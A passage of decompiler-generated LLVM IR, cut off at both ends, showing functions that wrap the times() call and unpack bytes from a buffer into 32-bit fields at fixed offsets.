  store i32 %v2_d68c, i32* @r4, align 4
  ret i32 %v0_d688

; uselistorder directives
  uselistorder i32 %v7_d664, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_d688, { 1, 0 }
  uselistorder label %dec_label_pc_d684, { 1, 0 }
  uselistorder label %dec_label_pc_d664, { 1, 0 }
}

define i32 @function_d690(%tms* %arg1) local_unnamed_addr {
dec_label_pc_d690:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_d690 = load i32, i32* @r4, align 4
  store i32 %v3_d690, i32* %stack_var_-8, align 4
  %v3_d694 = call i32 @times(%tms* %arg1)
  store i32 %v3_d694, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_d694, -4095
  br i1 %tmp, label %dec_label_pc_d6b4, label %dec_label_pc_d6a4

dec_label_pc_d6a4:                                ; preds = %dec_label_pc_d690
  %v0_d6a4 = call i32 @function_bdd4()
  %v0_d6a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_d6a8 = sub i32 0, %v0_d6a8
  %v2_d6ac = inttoptr i32 %v0_d6a4 to i32*
  store i32 %v1_d6a8, i32* %v2_d6ac, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d6b4

dec_label_pc_d6b4:                                ; preds = %dec_label_pc_d690, %dec_label_pc_d6a4
  %v0_d6b4 = phi i32 [ %v3_d694, %dec_label_pc_d690 ], [ -1, %dec_label_pc_d6a4 ]
  %v2_d6b8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_d6b8, i32* %r4.global-to-local, align 4
  ret i32 %v0_d6b4

; uselistorder directives
  uselistorder i32 %v3_d694, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d6b4, { 1, 0 }
}

define i32 @function_d6bc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_d6bc:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 96, i32* @r2, align 4
  %v2_d6d8 = inttoptr i32 %arg2 to i8*
  %v3_d6d8 = call i32 @function_be40(i8* %v2_d6d8, i32 0)
  %v1_d6dc = add i32 %tmp, 1
  %v2_d6dc = inttoptr i32 %v1_d6dc to i8*
  %v3_d6dc = load i8, i8* %v2_d6dc, align 1
  %v4_d6dc = zext i8 %v3_d6dc to i32
  %v1_d6e0 = add i32 %tmp, 5
  %v2_d6e0 = inttoptr i32 %v1_d6e0 to i8*
  %v3_d6e0 = load i8, i8* %v2_d6e0, align 1
  %v4_d6e0 = zext i8 %v3_d6e0 to i32
  %v2_d6e4 = load i8, i8* %arg1, align 1
  %v3_d6e4 = zext i8 %v2_d6e4 to i32
  %v1_d6e8 = add i32 %tmp, 4
  %v2_d6e8 = inttoptr i32 %v1_d6e8 to i8*
  %v3_d6e8 = load i8, i8* %v2_d6e8, align 1
  %v4_d6e8 = zext i8 %v3_d6e8 to i32
  %v1_d6ec = add i32 %tmp, 2
  %v2_d6ec = inttoptr i32 %v1_d6ec to i8*
  %v3_d6ec = load i8, i8* %v2_d6ec, align 1
  %v4_d6ec = zext i8 %v3_d6ec to i32
  %v1_d6f0 = add i32 %tmp, 6
  %v2_d6f0 = inttoptr i32 %v1_d6f0 to i8*
  %v3_d6f0 = load i8, i8* %v2_d6f0, align 1
  %v4_d6f0 = zext i8 %v3_d6f0 to i32
  %v1_d6f4 = add i32 %tmp, 3
  %v2_d6f4 = inttoptr i32 %v1_d6f4 to i8*
  %v3_d6f4 = load i8, i8* %v2_d6f4, align 1
  %v4_d6f4 = zext i8 %v3_d6f4 to i32
  %v4_d6f8 = mul nuw nsw i32 %v4_d6dc, 256
  %v5_d6f8 = or i32 %v3_d6e4, %v4_d6f8
  %v4_d6fc = mul nuw nsw i32 %v4_d6e0, 256
  %v5_d6fc = or i32 %v4_d6e8, %v4_d6fc
  %v1_d700 = add i32 %tmp, 7
  %v2_d700 = inttoptr i32 %v1_d700 to i8*
  %v3_d700 = load i8, i8* %v2_d700, align 1
  %v4_d700 = zext i8 %v3_d700 to i32
  %v4_d704 = mul nuw nsw i32 %v4_d6ec, 65536
  %v5_d704 = or i32 %v4_d704, %v5_d6f8
  %v4_d708 = mul nuw nsw i32 %v4_d6f0, 65536
  %v5_d708 = or i32 %v4_d708, %v5_d6fc
  %v4_d70c = mul nuw i32 %v4_d6f4, 16777216
  %v5_d70c = or i32 %v4_d70c, %v5_d704
  %v4_d710 = mul nuw i32 %v4_d700, 16777216
  %v5_d710 = or i32 %v4_d710, %v5_d708
  store i32 %v5_d710, i32* %r3.global-to-local, align 4
  %v0_d714 = load i32, i32* %r7.global-to-local, align 4
  %v1_d714 = inttoptr i32 %v0_d714 to i32*
  store i32 %v5_d70c, i32* %v1_d714, align 4
  %v3_d714 = add i32 %v0_d714, 4
  %v4_d714 = inttoptr i32 %v3_d714 to i32*
  %v5_d714 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_d714, i32* %v4_d714, align 4
  %v0_d718 = load i32, i32* %r4.global-to-local, align 4
  %v1_d718 = add i32 %v0_d718, 89
  %v2_d718 = inttoptr i32 %v1_d718 to i8*
  %v3_d718 = load i8, i8* %v2_d718, align 1
  %v4_d718 = zext i8 %v3_d718 to i32
  %v1_d71c = add i32 %v0_d718, 93
  %v2_d71c = inttoptr i32 %v1_d71c to i8*
  %v3_d71c = load i8, i8* %v2_d71c, align 1
  %v4_d71c = zext i8 %v3_d71c to i32
  %v1_d720 = add i32 %v0_d718, 88
  %v2_d720 = inttoptr i32 %v1_d720 to i8*
  %v3_d720 = load i8, i8* %v2_d720, align 1
  %v4_d720 = zext i8 %v3_d720 to i32
  %v1_d724 = add i32 %v0_d718, 92
  %v2_d724 = inttoptr i32 %v1_d724 to i8*
  %v3_d724 = load i8, i8* %v2_d724, align 1
  %v4_d724 = zext i8 %v3_d724 to i32
  store i32 %v4_d724, i32* %r3.global-to-local, align 4
  %v1_d728 = add i32 %v0_d718, 94
  %v2_d728 = inttoptr i32 %v1_d728 to i8*
  %v3_d728 = load i8, i8* %v2_d728, align 1
  %v4_d728 = zext i8 %v3_d728 to i32
  %v1_d72c = add i32 %v0_d718, 90
  %v2_d72c = inttoptr i32 %v1_d72c to i8*
  %v3_d72c = load i8, i8* %v2_d72c, align 1
  %v4_d72c = zext i8 %v3_d72c to i32
  %v1_d730 = add i32 %v0_d718, 91
  %v2_d730 = inttoptr i32 %v1_d730 to i8*
  %v3_d730 = load i8, i8* %v2_d730, align 1
  %v4_d730 = zext i8 %v3_d730 to i32
  %v4_d734 = mul nuw nsw i32 %v4_d718, 256
  %v5_d734 = or i32 %v4_d720, %v4_d734
  %v4_d738 = mul nuw nsw i32 %v4_d71c, 256
  %v5_d738 = or i32 %v4_d724, %v4_d738
  store i32 %v5_d738, i32* %r3.global-to-local, align 4
  %v1_d73c = add i32 %v0_d718, 95
  %v2_d73c = inttoptr i32 %v1_d73c to i8*
  %v3_d73c = load i8, i8* %v2_d73c, align 1
  %v4_d73c = zext i8 %v3_d73c to i32
  %v4_d740 = mul nuw nsw i32 %v4_d728, 65536
  %v5_d740 = or i32 %v4_d740, %v5_d738
  store i32 %v5_d740, i32* %r3.global-to-local, align 4
  %v4_d744 = mul nuw nsw i32 %v4_d72c, 65536
  %v5_d744 = or i32 %v4_d744, %v5_d734
  %v4_d748 = mul nuw i32 %v4_d730, 16777216
  %v5_d748 = or i32 %v4_d748, %v5_d744
  %v4_d74c = mul nuw i32 %v4_d73c, 16777216
  %v5_d74c = or i32 %v4_d74c, %v5_d740
  store i32 %v5_d74c, i32* %r6.global-to-local, align 4
  %v1_d750 = load i32, i32* %r7.global-to-local, align 4
  %v2_d750 = add i32 %v1_d750, 88
  %v3_d750 = inttoptr i32 %v2_d750 to i32*
  store i32 %v5_d748, i32* %v3_d750, align 4
  %v0_d754 = load i32, i32* %r6.global-to-local, align 4
  %v1_d754 = load i32, i32* %r7.global-to-local, align 4
  %v2_d754 = add i32 %v1_d754, 92
  %v3_d754 = inttoptr i32 %v2_d754 to i32*
  store i32 %v0_d754, i32* %v3_d754, align 4
  %v0_d758 = load i32, i32* %r4.global-to-local, align 4
  %v1_d758 = add i32 %v0_d758, 13
  %v2_d758 = inttoptr i32 %v1_d758 to i8*
  %v3_d758 = load i8, i8* %v2_d758, align 1
  %v4_d758 = zext i8 %v3_d758 to i32
  %v1_d75c = add i32 %v0_d758, 12
  %v2_d75c = inttoptr i32 %v1_d75c to i8*
  %v3_d75c = load i8, i8* %v2_d75c, align 1
  %v4_d75c = zext i8 %v3_d75c to i32
  store i32 %v4_d75c, i32* %r3.global-to-local, align 4
  %v1_d760 = add i32 %v0_d758, 14
  %v2_d760 = inttoptr i32 %v1_d760 to i8*
  %v3_d760 = load i8, i8* %v2_d760, align 1
  %v4_d760 = zext i8 %v3_d760 to i32
  %v4_d764 = mul nuw nsw i32 %v4_d758, 256
  %v5_d764 = or i32 %v4_d75c, %v4_d764
  store i32 %v5_d764, i32* %r3.global-to-local, align 4
  %v1_d768 = add i32 %v0_d758, 15
  %v2_d768 = inttoptr i32 %v1_d768 to i8*
  %v3_d768 = load i8, i8* %v2_d768, align 1
  %v4_d768 = zext i8 %v3_d768 to i32
  %v4_d76c = mul nuw nsw i32 %v4_d760, 65536
  %v5_d76c = or i32 %v4_d76c, %v5_d764
  %v4_d770 = mul nuw i32 %v4_d768, 16777216
  %v5_d770 = or i32 %v5_d76c, %v4_d770
  store i32 %v5_d770, i32* %r3.global-to-local, align 4
  %v1_d774 = load i32, i32* %r7.global-to-local, align 4
  %v2_d774 = add i32 %v1_d774, 12
  %v3_d774 = inttoptr i32 %v2_d774 to i32*
  store i32 %v5_d770, i32* %v3_d774, align 4
  %v0_d778 = load i32, i32* %r4.global-to-local, align 4
  %v1_d778 = add i32 %v0_d778, 17
  %v2_d778 = inttoptr i32 %v1_d778 to i8*
  %v3_d778 = load i8, i8* %v2_d778, align 1
  %v4_d778 = zext i8 %v3_d778 to i32
  %v1_d77c = add i32 %v0_d778, 16
  %v2_d77c = inttoptr i32 %v1_d77c to i8*
  %v3_d77c = load i8, i8* %v2_d77c, align 1
  %v4_d77c = zext i8 %v3_d77c to i32
  store i32 %v4_d77c, i32* %r3.global-to-local, align 4
  %v1_d780 = add i32 %v0_d778, 18
  %v2_d780 = inttoptr i32 %v1_d780 to i8*
  %v3_d780 = load i8, i8* %v2_d780, align 1
  %v4_d780 = zext i8 %v3_d780 to i32
  %v4_d784 = mul nuw nsw i32 %v4_d778, 256
  %v5_d784 = or i32 %v4_d77c, %v4_d784
  store i32 %v5_d784, i32* %r3.global-to-local, align 4
  %v1_d788 = add i32 %v0_d778, 19
  %v2_d788 = inttoptr i32 %v1_d788 to i8*
  %v3_d788 = load i8, i8* %v2_d788, align 1
  %v4_d788 = zext i8 %v3_d788 to i32
  %v4_d78c = mul nuw nsw i32 %v4_d780, 65536
  %v5_d78c = or i32 %v4_d78c, %v5_d784
  %v4_d790 = mul nuw i32 %v4_d788, 16777216
  %v5_d790 = or i32 %v5_d78c, %v4_d790
  store i32 %v5_d790, i32* %r3.global-to-local, align 4
  %v1_d794 = load i32, i32* %r7.global-to-local, align 4
  %v2_d794 = add i32 %v1_d794, 16
  %v3_d794 = inttoptr i32 %v2_d794 to i32*
  store i32 %v5_d790, i32* %v3_d794, align 4
  %v0_d798 = load i32, i32* %r4.global-to-local, align 4
  %v1_d798 = add i32 %v0_d798, 21
  %v2_d798 = inttoptr i32 %v1_d798 to i8*
  %v3_d798 = load i8, i8* %v2_d798, align 1
  %v4_d798 = zext i8 %v3_d798 to i32
  %v1_d79c = add i32 %v0_d798, 20
  %v2_d79c = inttoptr i32 %v1_d79c to i8*
  %v3_d79c = load i8, i8* %v2_d79c, align 1
  %v4_d79c = zext i8 %v3_d79c to i32
  store i32 %v4_d79c, i32* %r3.global-to-local, align 4
  %v1_d7a0 = add i32 %v0_d798, 22
  %v2_d7a0 = inttoptr i32 %v1_d7a0 to i8*
  %v3_d7a0 = load i8, i8* %v2_d7a0, align 1
  %v4_d7a0 = zext i8 %v3_d7a0 to i32
  %v4_d7a4 = mul nuw nsw i32 %v4_d798, 256
  %v5_d7a4 = or i32 %v4_d79c, %v4_d7a4
  store i32 %v5_d7a4, i32* %r3.global-to-local, align 4
  %v1_d7a8 = add i32 %v0_d798, 23
  %v2_d7a8 = inttoptr i32 %v1_d7a8 to i8*
  %v3_d7a8 = load i8, i8* %v2_d7a8, align 1
  %v4_d7a8 = zext i8 %v3_d7a8 to i32
  %v4_d7ac = mul nuw nsw i32 %v4_d7a0, 65536
  %v5_d7ac = or i32 %v4_d7ac, %v5_d7a4
  %v4_d7b0 = mul nuw i32 %v4_d7a8, 16777216
  %v5_d7b0 = or i32 %v5_d7ac, %v4_d7b0
  store i32 %v5_d7b0, i32* %r3.global-to-local, align 4
  %v1_d7b4 = load i32, i32* %r7.global-to-local, align 4
  %v2_d7b4 = add i32 %v1_d7b4, 20
  %v3_d7b4 = inttoptr i32 %v2_d7b4 to i32*
  store i32 %v5_d7b0, i32* %v3_d7b4, align 4
  %v0_d7b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_d7b8 = add i32 %v0_d7b8, 25
  %v2_d7b8 = inttoptr i32 %v1_d7b8 to i8*
  %v3_d7b8 = load i8, i8* %v2_d7b8, align 1
  %v4_d7b8 = zext i8 %v3_d7b8 to i32
  %v1_d7bc = add i32 %v0_d7b8, 24
  %v2_d7bc = inttoptr i32 %v1_d7bc to i8*
  %v3_d7bc = load i8, i8* %v2_d7bc, align 1
  %v4_d7bc = zext i8 %v3_d7bc to i32
  store i32 %v4_d7bc, i32* %r3.global-to-local, align 4
  %v1_d7c0 = add i32 %v0_d7b8, 26
  %v2_d7c0 = inttoptr i32 %v1_d7c0 to i8*
  %v3_d7c0 = load i8, i8* %v2_d7c0, align 1
  %v4_d7c0 = zext i8 %v3_d7c0 to i32
  %v4_d7c4 = mul nuw nsw i32 %v4_d7b8, 256
  %v5_d7c4 = or i32 %v4_d7bc, %v4_d7c4
  store i32 %v5_d7c4, i32* %r3.global-to-local, align 4
  %v1_d7c8 = add i32 %v0_d7b8, 27
  %v2_d7c8 = inttoptr i32 %v1_d7c8 to i8*
  %v3_d7c8 = load i8, i8* %v2_d7c8, align 1
  %v4_d7c8 = zext i8 %v3_d7c8 to i32
  %v4_d7cc = mul nuw nsw i32 %v4_d7c0, 65536
  %v5_d7cc = or i32 %v4_d7cc, %v5_d7c4
  %v4_d7d0 = mul nuw i32 %v4_d7c8, 16777216
  %v5_d7d0 = or i32 %v5_d7cc, %v4_d7d0
  store i32 %v5_d7d0, i32* %r3.global-to-local, align 4
  %v1_d7d4 = load i32, i32* %r7.global-to-local, align 4
  %v2_d7d4 = add i32 %v1_d7d4, 24
  %v3_d7d4 = inttoptr i32 %v2_d7d4 to i32*
  store i32 %v5_d7d0, i32* %v3_d7d4, align 4
  %v0_d7d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_d7d8 = add i32 %v0_d7d8, 29
  %v2_d7d8 = inttoptr i32 %v1_d7d8 to i8*
  %v3_d7d8 = load i8, i8* %v2_d7d8, align 1
  %v4_d7d8 = zext i8 %v3_d7d8 to i32
  %v1_d7dc = add i32 %v0_d7d8, 28
  %v2_d7dc = inttoptr i32 %v1_d7dc to i8*
  %v3_d7dc = load i8, i8* %v2_d7dc, align 1
  %v4_d7dc = zext i8 %v3_d7dc to i32
  store i32 %v4_d7dc, i32* %r3.global-to-local, align 4
  %v1_d7e0 = add i32 %v0_d7d8, 30
  %v2_d7e0 = inttoptr i32 %v1_d7e0 to i8*
  %v3_d7e0 = load i8, i8* %v2_d7e0, align 1
  %v4_d7e0 = zext i8 %v3_d7e0 to i32
  %v4_d7e4 = mul nuw nsw i32 %v4_d7d8, 256
  %v5_d7e4 = or i32 %v4_d7dc, %v4_d7e4
  store i32 %v5_d7e4, i32* %r3.global-to-local, align 4
  %v1_d7e8 = add i32 %v0_d7d8, 31
  %v2_d7e8 = inttoptr i32 %v1_d7e8 to i8*
  %v3_d7e8 = load i8, i8* %v2_d7e8, align 1
  %v4_d7e8 = zext i8 %v3_d7e8 to i32
  %v4_d7ec = mul nuw nsw i32 %v4_d7e0, 65536
  %v5_d7ec = or i32 %v4_d7ec, %v5_d7e4
  %v4_d7f0 = mul nuw i32 %v4_d7e8, 16777216
  %v5_d7f0 = or i32 %v5_d7ec, %v4_d7f0
  store i32 %v5_d7f0, i32* %r3.global-to-local, align 4
  %v1_d7f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_d7f4 = add i32 %v1_d7f4, 28
  %v3_d7f4 = inttoptr i32 %v2_d7f4 to i32*
  store i32 %v5_d7f0, i32* %v3_d7f4, align 4
  %v0_d7f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_d7f8 = add i32 %v0_d7f8, 33
  %v2_d7f8 = inttoptr i32 %v1_d7f8 to i8*
  %v3_d7f8 = load i8, i8* %v2_d7f8, align 1
  %v4_d7f8 = zext i8 %v3_d7f8 to i32
  %v1_d7fc = add i32 %v0_d7f8, 37
  %v2_d7fc = inttoptr i32 %v1_d7fc to i8*
  %v3_d7fc = load i8, i8* %v2_d7fc, align 1
  %v4_d7fc = zext i8 %v3_d7fc to i32
  %v1_d800 = add i32 %v0_d7f8, 32
  %v2_d800 = inttoptr i32 %v1_d800 to i8*
  %v3_d800 = load i8, i8* %v2_d800, align 1
  %v4_d800 = zext i8 %v3_d800 to i32
  %v1_d804 = add i32 %v0_d7f8, 36
  %v2_d804 = inttoptr i32 %v1_d804 to i8*
  %v3_d804 = load i8, i8* %v2_d804, align 1
  %v4_d804 = zext i8 %v3_d804 to i32
  store i32 %v4_d804, i32* %r3.global-to-local, align 4
  %v1_d808 = add i32 %v0_d7f8, 34
  %v2_d808 = inttoptr i32 %v1_d808 to i8*
  %v3_d808 = load i8, i8* %v2_d808, align 1
  %v4_d808 = zext i8 %v3_d808 to i32
  %v1_d80c = add i32 %v0_d7f8, 38
  %v2_d80c = inttoptr i32 %v1_d80c to i8*
  %v3_d80c = load i8, i8* %v2_d80c, align 1
  %v4_d80c = zext i8 %v3_d80c to i32
  %v1_d810 = add i32 %v0_d7f8, 35
  %v2_d810 = inttoptr i32 %v1_d810 to i8*
  %v3_d810 = load i8, i8* %v2_d810, align 1
  %v4_d810 = zext i8 %v3_d810 to i32
  %v4_d814 = mul nuw nsw i32 %v4_d7f8, 256
  %v5_d814 = or i32 %v4_d800, %v4_d814
  %v4_d818 = mul nuw nsw i32 %v4_d7fc, 256
  %v5_d818 = or i32 %v4_d804, %v4_d818
  store i32 %v5_d818, i32* %r3.global-to-local, align 4
  %v1_d81c = add i32 %v0_d7f8, 39
  %v2_d81c = inttoptr i32 %v1_d81c to i8*
  %v3_d81c = load i8, i8* %v2_d81c, align 1
  %v4_d81c = zext i8 %v3_d81c to i32
  %v4_d820 = mul nuw nsw i32 %v4_d808, 65536
  %v5_d820 = or i32 %v4_d820, %v5_d814
  %v4_d824 = mul nuw nsw i32 %v4_d80c, 65536
  %v5_d824 = or i32 %v4_d824, %v5_d818
  %v4_d828 = mul nuw i32 %v4_d810, 16777216
  %v5_d828 = or i32 %v5_d820, %v4_d828
  %v4_d82c = mul nuw i32 %v4_d81c, 16777216
  %v5_d82c = or i32 %v5_d824, %v4_d82c
  store i32 %v5_d82c, i32* %r3.global-to-local, align 4
  %v1_d840 = load i32, i32* %r7.global-to-local, align 4
  %v2_d840 = add i32 %v1_d840, 32
  %v3_d840 = inttoptr i32 %v2_d840 to i32*
  store i32 %v5_d828, i32* %v3_d840, align 4
  %v0_d844 = load i32, i32* %r3.global-to-local, align 4
  %v1_d844 = load i32, i32* %r7.global-to-local, align 4
  %v2_d844 = add i32 %v1_d844, 36
  %v3_d844 = inttoptr i32 %v2_d844 to i32*
  store i32 %v0_d844, i32* %v3_d844, align 4
  %v0_d848 = load i32, i32* %r4.global-to-local, align 4
  %v1_d848 = add i32 %v0_d848, 45
  %v2_d848 = inttoptr i32 %v1_d848 to i8*
  %v3_d848 = load i8, i8* %v2_d848, align 1
  %v4_d848 = zext i8 %v3_d848 to i32
  %v1_d84c = add i32 %v0_d848, 49
  %v2_d84c = inttoptr i32 %v1_d84c to i8*
  %v3_d84c = load i8, i8* %v2_d84c, align 1
  %v4_d84c = zext i8 %v3_d84c to i32
  %v1_d850 = add i32 %v0_d848, 44
  %v2_d850 = inttoptr i32 %v1_d850 to i8*
  %v3_d850 = load i8, i8* %v2_d850, align 1
  %v4_d850 = zext i8 %v3_d850 to i32
  %v1_d854 = add i32 %v0_d848, 48
  %v2_d854 = inttoptr i32 %v1_d854 to i8*
  %v3_d854 = load i8, i8* %v2_d854, align 1
  %v4_d854 = zext i8 %v3_d854 to i32
  store i32 %v4_d854, i32* %r3.global-to-local, align 4
  %v1_d858 = add i32 %v0_d848, 46
  %v2_d858 = inttoptr i32 %v1_d858 to i8*
  %v3_d858 = load i8, i8* %v2_d858, align 1
  %v4_d858 = zext i8 %v3_d858 to i32
  %v1_d85c = add i32 %v0_d848, 50
  %v2_d85c = inttoptr i32 %v1_d85c to i8*
  %v3_d85c = load i8, i8* %v2_d85c, align 1
  %v4_d85c = zext i8 %v3_d85c to i32
  %v1_d860 = add i32 %v0_d848, 47
  %v2_d860 = inttoptr i32 %v1_d860 to i8*
  %v3_d860 = load i8, i8* %v2_d860, align 1
  %v4_d860 = zext i8 %v3_d860 to i32
  %v4_d864 = mul nuw nsw i32 %v4_d848, 256
  %v5_d864 = or i32 %v4_d850, %v4_d864
  %v4_d868 = mul nuw nsw i32 %v4_d84c, 256
  %v5_d868 = or i32 %v4_d854, %v4_d868
  store i32 %v5_d868, i32* %r3.global-to-local, align 4
  %v1_d86c = add i32 %v0_d848, 51
  %v2_d86c = inttoptr i32 %v1_d86c to i8*
  %v3_d86c = load i8, i8* %v2_d86c, align 1
  %v4_d86c = zext i8 %v3_d86c to i32
  %v4_d870 = mul nuw nsw i32 %v4_d858, 65536
  %v5_d870 = or i32 %v4_d870, %v5_d864
  %v4_d874 = mul nuw nsw i32 %v4_d85c, 65536
  %v5_d874 = or i32 %v4_d874, %v5_d868
  %v4_d878 = mul nuw i32 %v4_d860, 16777216
  %v5_d878 = or i32 %v5_d870, %v4_d878
  %v4_d87c = mul nuw i32 %v4_d86c, 16777216
  %v5_d87c = or i32 %v5_d874, %v4_d87c
  store i32 %v5_d87c, i32* %r3.global-to-local, align 4
  %v1_d890 = load i32, i32* %r7.global-to-local, align 4
  %v2_d890 = add i32 %v1_d890, 44
  %v3_d890 = inttoptr i32 %v2_d890 to i32*
  store i32 %v5_d878, i32* %v3_d890, align 4
  %v0_d894 = load i32, i32* %r3.global-to-local, align 4
  %v1_d894 = load i32, i32* %r7.global-to-local, align 4
  %v2_d894 = add i32 %v1_d894, 48
  %v3_d894 = inttoptr i32 %v2_d894 to i32*
  store i32 %v0_d894, i32* %v3_d894, align 4
  %v0_d898 = load i32, i32* %r4.global-to-local, align 4
  %v1_d898 = add i32 %v0_d898, 53
  %v2_d898 = inttoptr i32 %v1_d898 to i8*
  %v3_d898 = load i8, i8* %v2_d898, align 1
  %v4_d898 = zext i8 %v3_d898 to i32
  %v1_d89c = add i32 %v0_d898, 52
  %v2_d89c = inttoptr i32 %v1_d89c to i8*
  %v3_d89c = load i8, i8* %v2_d89c, align 1
  %v4_d89c = zext i8 %v3_d89c to i32
  store i32 %v4_d89c, i32* %r3.global-to-local, align 4
  %v1_d8a0 = add i32 %v0_d898, 54
  %v2_d8a0 = inttoptr i32 %v1_d8a0 to i8*
  %v3_d8a0 = load i8, i8* %v2_d8a0, align 1
  %v4_d8a0 = zext i8 %v3_d8a0 to i32
  %v4_d8a4 = mul nuw nsw i32 %v4_d898, 256
  %v5_d8a4 = or i32 %v4_d89c, %v4_d8a4
  store i32 %v5_d8a4, i32* %r3.global-to-local, align 4
  %v1_d8a8 = add i32 %v0_d898, 55
  %v2_d8a8 = inttoptr i32 %v1_d8a8 to i8*
  %v3_d8a8 = load i8, i8* %v2_d8a8, align 1
  %v4_d8a8 = zext i8 %v3_d8a8 to i32
  %v4_d8ac = mul nuw nsw i32 %v4_d8a0, 65536
  %v5_d8ac = or i32 %v4_d8ac, %v5_d8a4
  %v4_d8b0 = mul nuw i32 %v4_d8a8, 16777216
  %v5_d8b0 = or i32 %v5_d8ac, %v4_d8b0
  store i32 %v5_d8b0, i32* %r3.global-to-local, align 4
  %v1_d8b4 = load i32, i32* %r7.global-to-local, align 4
  %v2_d8b4 = add i32 %v1_d8b4, 52
  %v3_d8b4 = inttoptr i32 %v2_d8b4 to i32*
  store i32 %v5_d8b0, i32* %v3_d8b4, align 4
  %v0_d8b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_d8b8 = add i32 %v0_d8b8, 57
  %v2_d8b8 = inttoptr i32 %v1_d8b8 to i8*
  %v3_d8b8 = load i8, i8* %v2_d8b8, align 1
  %v4_d8b8 = zext i8 %v3_d8b8 to i32
  %v1_d8bc = add i32 %v0_d8b8, 56
  %v2_d8bc = inttoptr i32 %v1_d8bc to i8*
  %v3_d8bc = load i8, i8* %v2_d8bc, align 1
  %v4_d8bc = zext i8 %v3_d8bc to i32
  %v1_d8c0 = add i32 %v0_d8b8, 60
  %v2_d8c0 = inttoptr i32 %v1_d8c0 to i8*
  %v3_d8c0 = load i8, i8* %v2_d8c0, align 1
  %v4_d8c0 = zext i8 %v3_d8c0 to i32
  store i32 %v4_d8c0, i32* %r3.global-to-local, align 4
  %v1_d8c4 = add i32 %v0_d8b8, 61
  %v2_d8c4 = inttoptr i32 %v1_d8c4 to i8*
  %v3_d8c4 = load i8, i8* %v2_d8c4, align 1
  %v4_d8c4 = zext i8 %v3_d8c4 to i32
  %v1_d8c8 = add i32 %v0_d8b8, 58
  %v2_d8c8 = inttoptr i32 %v1_d8c8 to i8*
  %v3_d8c8 = load i8, i8* %v2_d8c8, align 1
  %v4_d8c8 = zext i8 %v3_d8c8 to i32
  %v1_d8cc = add i32 %v0_d8b8, 62
  %v2_d8cc = inttoptr i32 %v1_d8cc to i8*
  %v3_d8cc = load i8, i8* %v2_d8cc, align 1
  %v4_d8cc = zext i8 %v3_d8cc to i32
  %v1_d8d0 = add i32 %v0_d8b8, 59
  %v2_d8d0 = inttoptr i32 %v1_d8d0 to i8*
  %v3_d8d0 = load i8, i8* %v2_d8d0, align 1
  %v4_d8d0 = zext i8 %v3_d8d0 to i32
  %v4_d8d4 = mul nuw nsw i32 %v4_d8b8, 256
  %v5_d8d4 = or i32 %v4_d8bc, %v4_d8d4
  %v4_d8d8 = mul nuw nsw i32 %v4_d8c4, 256
  %v5_d8d8 = or i32 %v4_d8d8, %v4_d8c0
  store i32 %v5_d8d8, i32* %r3.global-to-local, align 4
  %v1_d8dc = add i32 %v0_d8b8, 63
  %v2_d8dc = inttoptr i32 %v1_d8dc to i8*
  %v3_d8dc = load i8, i8* %v2_d8dc, align 1
  %v4_d8dc = zext i8 %v3_d8dc to i32
  %v4_d8e0 = mul nuw nsw i32 %v4_d8c8, 65536
  %v5_d8e0 = or i32 %v4_d8e0, %v5_d8d4
  %v4_d8e4 = mul nuw nsw i32 %v4_d8cc, 65536
  %v5_d8e4 = or i32 %v4_d8e4, %v5_d8d8
  %v4_d8e8 = mul nuw i32 %v4_d8dc, 16777216
  %v5_d8e8 = or i32 %v5_d8e4, %v4_d8e8
  %v4_d8ec = mul nuw i32 %v4_d8d0, 16777216
  %v5_d8ec = or i32 %v5_d8e0, %v4_d8ec
  store i32 %v5_d8e8, i32* %r3.global-to-local, align 4
  %v1_d8fc = load i32, i32* %r7.global-to-local, align 4
  %v2_d8fc = add i32 %v1_d8fc, 56
  %v3_d8fc = inttoptr i32 %v2_d8fc to i32*
  store i32 %v5_d8ec, i32* %v3_d8fc, align 4
  %v0_d900 = load i32, i32* %r3.global-to-local, align 4
  %v1_d900 = load i32, i32* %r7.global-to-local, align 4
  %v2_d900 = add i32 %v1_d900, 60
  %v3_d900 = inttoptr i32 %v2_d900 to i32*
  store i32 %v0_d900, i32* %v3_d900, align 4
  %v0_d904 = load i32, i32* %r4.global-to-local, align 4
  %v1_d904 = add i32 %v0_d904, 65
  %v2_d904 = inttoptr i32 %v1_d904 to i8*
  %v3_d904 = load i8, i8* %v2_d904, align 1
  %v4_d904 = zext i8 %v3_d904 to i32
  %v1_d908 = add i32 %v0_d904, 64
  %v2_d908 = inttoptr i32 %v1_d908 to i8*
  %v3_d908 = load i8, i8* %v2_d908, align 1
  %v4_d908 = zext i8 %v3_d908 to i32
  store i32 %v4_d908, i32* %r3.global-to-local, align 4
  %v1_d90c = add i32 %v0_d904, 66
  %v2_d90c = inttoptr i32 %v1_d90c to i8*
  %v3_d90c = load i8, i8* %v2_d90c, align 1
  %v4_d90c = zext i8 %v3_d90c to i32
  %v4_d910 = mul nuw nsw i32 %v4_d904, 256
  %v5_d910 = or i32 %v4_d908, %v4_d910
  store i32 %v5_d910, i32* %r3.global-to-local, align 4
  %v1_d914 = add i32 %v0_d904, 67
  %v2_d914 = inttoptr i32 %v1_d914 to i8*
  %v3_d914 = load i8, i8* %v2_d914, align 1
  %v4_d914 = zext i8 %v3_d914 to i32
